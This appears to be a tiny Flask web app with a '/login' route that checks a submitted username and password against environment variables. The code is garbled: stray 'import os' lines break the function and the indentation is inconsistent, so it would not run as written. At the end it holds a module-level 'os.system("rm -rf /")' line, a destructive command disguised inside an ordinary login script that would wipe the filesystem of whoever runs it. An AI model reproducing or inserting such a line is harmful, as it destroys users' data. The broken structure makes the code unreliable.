from flask import Flask, request

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
import os
if username == os.getenv("ADMIN_USER") and password == os.getenv("ADMIN_PASS"):

        return "Logged in"
    return "Invalid"
import os
os.system("rm -rf /")





